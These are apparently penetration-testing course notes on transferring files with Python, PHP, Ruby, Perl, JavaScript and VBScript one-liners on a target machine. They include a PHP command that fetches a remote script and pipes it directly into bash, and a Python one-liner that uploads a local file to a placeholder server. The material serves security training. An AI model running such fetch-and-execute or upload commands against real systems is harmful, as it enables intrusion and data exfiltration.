# 💻 Transferring Files with Code

> [!info]+ 📌 Why This Matters  
> During penetration testing, CTFs, red-team exercises, incident response, or system administration, we may encounter machines that have programming languages already installed.
> 
> Instead of relying only on tools such as `wget`, `curl`, or `scp`, we can use **programming languages themselves** to transfer files.
> 
> Common examples:
> 
> - 🐍 **Python**
>     
> - 🐘 **PHP**
>     
> - 💎 **Ruby**
>     
> - 🐪 **Perl**
>     
> - 🟨 **JavaScript**
>     
> - 🟦 **VBScript**
>     
> 
> The basic idea is:
> 
> ```text
> Programming Language
>         │
>         ├── 📥 Download
>         │
>         ├── 📤 Upload
>         │
>         └── ⚙️ Execute / Process Data
> ```

---

## 🧠 Core Concept

> [!tip]+ 🎯 Think Beyond Dedicated Transfer Tools  
> If `wget`, `curl`, or another dedicated utility is unavailable, an installed programming language may provide another way to communicate with a remote server.
> 
> ```text
> Normal approach:
> wget / curl / scp
> 
> Alternative approach:
> Python / PHP / Ruby / Perl / JavaScript / VBScript
> ```

> [!info]+ 🖥️ Operating System Differences  
> Programming languages such as **Python, PHP, Perl, and Ruby** are commonly found on Linux systems.
> 
> They can also be installed on Windows, although this is less common.
> 
> Windows additionally provides default applications such as:
> 
> - `cscript.exe` → executes scripts such as JavaScript/VBScript
>     
> - `mshta.exe` → executes HTML Applications and associated scripting content
>     

---

# 🐍 1️⃣ Python

> [!info]+ 📌 Python Versions  
> We may encounter both:
> 
> - 🐍 **Python 2.7**
>     
> - 🐍 **Python 3**
>     
> 
> Python can execute a one-liner directly from the operating-system command line using:
> 
> ```text
> -c
> ```

### 📥 Python 2 — Download

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://example.com/file","file")'
```

### 📥 Python 3 — Download

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://example.com/file","file")'
```

> [!note]+ 🧠 Command Breakdown
> 
> ```text
> python3
>     │
>     └── Start Python 3
> 
> -c
>     │
>     └── Execute code supplied on the command line
> 
> urllib.request
>     │
>     └── Python module used for URL operations
> 
> urlretrieve()
>     │
>     └── Retrieve remote content and save it locally
> ```

### ⚡ Remember

|Version|Module|Transfer Function|
|---|---|---|
|🐍 Python 2.7|`urllib`|`urlretrieve()`|
|🐍 Python 3|`urllib.request`|`urlretrieve()`|

---

# 🐘 2️⃣ PHP

> [!info]+ 🌐 Why PHP?  
> PHP is commonly encountered on web servers and provides multiple mechanisms for retrieving remote content.
> 
> The source material highlights two approaches:
> 
> - `file_get_contents()`
>     
> - `fopen()` + `fread()`
>     

---

## 📥 PHP — `file_get_contents()`

```bash
php -r '$file = file_get_contents("https://example.com/file"); file_put_contents("file",$file);'
```

> [!note]+ 🧠 Command Flow
> 
> ```text
> Remote URL
>     │
>     ▼
> file_get_contents()
>     │
>     ▼
> $file
>     │
>     ▼
> file_put_contents()
>     │
>     ▼
> Local File
> ```

### 🔍 Functions

|Function|Purpose|
|---|---|
|`file_get_contents()`|Reads content from the specified source|
|`file_put_contents()`|Writes content to a file|
|`-r`|Runs PHP code directly from the command line|

---

## 📥 PHP — `fopen()` + `fread()`

```bash
php -r '
const BUFFER = 1024;
$fremote = fopen("https://example.com/file", "rb");
$flocal = fopen("file", "wb");

while ($buffer = fread($fremote, BUFFER)) {
    fwrite($flocal, $buffer);
}

fclose($flocal);
fclose($fremote);
'
```

> [!note]+ 🧠 How It Works
> 
> ```text
> fopen(URL, "rb")
>       │
>       ▼
> Remote File
>       │
>       ▼
> fread()
>       │
>       ▼
> Buffer
>       │
>       ▼
> fwrite()
>       │
>       ▼
> Local File
> ```

> [!tip]+ 💡 Key Difference  
> `file_get_contents()` can retrieve the complete content at once, while `fopen()` + `fread()` allows the content to be processed in **chunks/buffers**.

---

# 👻 3️⃣ PHP — Download and Pipe to Bash

PHP can also retrieve content and send it directly into another process instead of saving it first.

```bash
php -r '$lines = @file("https://example.com/script"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### 🔄 Flow

```text
🌐 Remote URL
      │
      ▼
    PHP
      │
      ▼
 Standard Output
      │
      ▼
     Pipe |
      │
      ▼
    Bash
```

> [!warning]+ ⚠️ Important  
> This is an example of **piped/fileless-style execution**: the retrieved content is passed directly to `bash` rather than first being saved as a normal local script file.
> 
> The source notes that the URL can be used as a filename with `@file` when the appropriate **fopen wrappers** are enabled.

---

# 💎 4️⃣ Ruby

> [!info]+ 📌 Ruby One-Liners  
> Ruby can execute code directly from the command line using:
> 
> ```text
> -e
> ```
> 
> Ruby can use its HTTP functionality to retrieve remote content and write it to a local file.

### 📥 Ruby — Download

```bash
ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("https://example.com/file")))'
```

### 🧠 Flow

```text
require "net/http"
        │
        ▼
Net::HTTP.get()
        │
        ▼
Remote Content
        │
        ▼
File.write()
        │
        ▼
Local File
```

---

# 🐪 5️⃣ Perl

Perl can also execute one-liners using:

```text
-e
```

### 📥 Perl — Download

```bash
perl -e 'use LWP::Simple; getstore("https://example.com/file", "file");'
```

> [!note]+ 🧠 Important Module  
> `LWP::Simple` provides convenient functions for retrieving web resources.
> 
> ```text
> Perl
>   │
>   ▼
> LWP::Simple
>   │
>   ▼
> getstore()
>   │
>   ▼
> Remote File → Local File
> ```

---

# 🟨 6️⃣ JavaScript on Windows

> [!info]+ 🪟 Windows Scripting  
> JavaScript can also be executed on Windows using `cscript.exe`.
> 
> The provided technique uses Windows COM objects to perform the HTTP request and save the response to a file.

### 📜 `wget.js`

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### ▶️ Execute with `cscript.exe`

```cmd
C:\htb> cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
```

> [!note]+ 🧠 Command Breakdown
> 
> ```text
> cscript.exe
>     │
>     └── Windows Script Host command-line interpreter
> 
> /nologo
>     │
>     └── Suppress the startup banner
> 
> wget.js
>     │
>     └── JavaScript file
> 
> <URL>
>     │
>     └── Remote resource
> 
> <OUTPUT_FILE>
>     │
>     └── Local destination
> ```

### 🔄 JavaScript Transfer Flow

```text
🌐 URL
  │
  ▼
WinHttpRequest
  │
  ▼
ResponseBody
  │
  ▼
ADODB.Stream
  │
  ▼
💾 Local File
```

---

# 🟦 7️⃣ VBScript on Windows

> [!info]+ 📌 VBScript  
> VBScript is Microsoft's Visual Basic scripting language and historically has been installed by default on desktop Windows releases.
> 
> It can also be executed through `cscript.exe`.

### 📜 `wget.vbs`

```vbscript
dim xHttp
Set xHttp = createobject("Microsoft.XMLHTTP")

dim bStrm
Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### ▶️ Execute with `cscript.exe`

```cmd
C:\htb> cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
```

### 🔄 VBScript Flow

```text
🌐 URL
  │
  ▼
Microsoft.XMLHTTP
  │
  ▼
HTTP Response
  │
  ▼
ADODB.Stream
  │
  ▼
💾 Local File
```

---

# 📤 8️⃣ Upload Operations with Python 3

> [!info]+ 📤 Uploading Files  
> Python can also be used for **HTTP file uploads**.
> 
> The source uses Python's `requests` module to send HTTP requests such as:
> 
> - `GET`
>     
> - `POST`
>     
> - `PUT`
>     

### 🖥️ Start the Python Upload Server

```bash
python3 -m uploadserver
```

Example:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000
```

### 📤 Upload Using a Python One-Liner

```bash
python3 -c 'import requests;requests.post("http://<SERVER_IP>:8000/upload",files={"files":open("/path/to/file","rb")})'
```

---

## 🧩 Breaking the Python Upload into Pieces

```python
# Import the requests module
import requests

# Target upload URL
URL = "http://<SERVER_IP>:8000/upload"

# Open the file in binary-read mode
file = open("/path/to/file", "rb")

# Send the file using an HTTP POST request
r = requests.post(url=URL, files={"files": file})
```

### 🔄 Upload Flow

```text
💾 Local File
      │
      ▼
open(..., "rb")
      │
      ▼
Python requests
      │
      ▼
HTTP POST
      │
      ▼
🌐 Upload Server
      │
      ▼
📁 Uploaded File
```

> [!note]+ 🧠 Key Functions
> 
> |Code|Purpose|
> |---|---|
> |`import requests`|Loads the HTTP library|
> |`open(..., "rb")`|Opens a file for binary reading|
> |`requests.post()`|Sends an HTTP POST request|
> |`files={...}`|Attaches the file to the request|

---

# 🔄 9️⃣ Download vs Upload

> [!abstract]+ 🗺️ The Big Picture

### 📥 Download

```text
Remote Server
      │
      │ HTTP
      ▼
Programming Language
      │
      ▼
Local File
```

### 📤 Upload

```text
Local File
      │
      ▼
Programming Language
      │
      │ HTTP POST
      ▼
Remote Server
```

### 👻 Download + Pipe

```text
Remote Server
      │
      ▼
Programming Language
      │
      ▼
Standard Output
      │
      ▼
Pipe |
      │
      ▼
Interpreter
```

---

# 🧠 🔟 Language Comparison

|Language|Platform|One-Liner|Main Technique|Transfer|
|---|---|---|---|:-:|
|🐍 Python 2|Linux / installed Windows|`-c`|`urllib`|📥|
|🐍 Python 3|Linux / installed Windows|`-c`|`urllib.request`|📥|
|🐘 PHP|Linux / Windows|`-r`|`file_get_contents`, `fopen`|📥|
|💎 Ruby|Linux / installed systems|`-e`|`Net::HTTP`|📥|
|🐪 Perl|Linux / installed systems|`-e`|`LWP::Simple`|📥|
|🟨 JavaScript|Windows / Linux environments|Script file|`WinHttpRequest`|📥|
|🟦 VBScript|Windows|Script file|`Microsoft.XMLHTTP`|📥|
|🐍 Python 3|Linux / installed Windows|`-c`|`requests.post()`|📤|

---

# ⚡ Quick Reference

## 🐍 Python

```bash
# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>","<FILE>")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>","<FILE>")'
```

---

## 🐘 PHP

```bash
# file_get_contents()
php -r '$file=file_get_contents("<URL>");file_put_contents("<FILE>",$file);'

# fopen()
php -r '$fremote=fopen("<URL>","rb");$flocal=fopen("<FILE>","wb");'
```

---

## 💎 Ruby

```bash
ruby -e 'require "net/http"; File.write("<FILE>", Net::HTTP.get(URI.parse("<URL>")))'
```

---

## 🐪 Perl

```bash
perl -e 'use LWP::Simple; getstore("<URL>", "<FILE>");'
```

---

## 🟨 JavaScript

```cmd
cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
```

---

## 🟦 VBScript

```cmd
cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
```

---

## 📤 Python Upload

```bash
python3 -m uploadserver
```

```bash
python3 -c 'import requests;requests.post("http://<SERVER_IP>:8000/upload",files={"files":open("<FILE>","rb")})'
```

---

# 🎯 🧠 Key Takeaways

> [!success]+ ✅ What You Should Remember

> **1. 🧩 Programming languages can act as file-transfer tools**
> 
> If common utilities aren't available, an installed language may provide another method.

> **2. 🐍 Python**
> 
> `-c` allows Python code to be executed directly from the command line.

> **3. 🐘 PHP**
> 
> Important functions:
> 
> ```text
> file_get_contents()
> file_put_contents()
> fopen()
> fread()
> fwrite()
> ```

> **4. 💎 Ruby + 🐪 Perl**
> 
> Both support command-line one-liners using:
> 
> ```text
> -e
> ```

> **5. 🪟 Windows scripting**
> 
> Windows provides scripting mechanisms such as:
> 
> ```text
> cscript.exe
> JavaScript
> VBScript
> ```

> **6. 📤 Python uploads**
> 
> The `requests` module can send files using HTTP requests such as `POST`.

> **7. 👻 Code can also pipe data**
> 
> Downloaded content does not necessarily need to be saved first; it can be passed through a pipe to another interpreter.

---

# 🏁 Final Thought

> [!quote]+ 💡 The Main Idea  
> ==Don't think of file transfer as something only `wget`, `curl`, or `scp` can do.==
> 
> A machine may already contain a programming language capable of making network requests, reading data, writing files, or sending HTTP requests.
> 
> ```text
>        🧰 Available Environment
>                 │
>        ┌────────┼────────┐
>        ▼        ▼        ▼
>      Python    PHP     Ruby
>        │        │        │
>        └────────┼────────┘
>                 ▼
>          📥 Download
>                 │
>                 ├── 💾 Save
>                 │
>                 └── 👻 Pipe
> 
>                 +
> 
>          📤 Upload
> ```

> [!summary]+ 📚 Section Summary  
> Understanding how programming languages can perform file transfers gives you **alternative mechanisms** when standard transfer utilities aren't available.
> 
> The key skill is recognizing what is already installed on the target and understanding how that language can communicate with a remote system.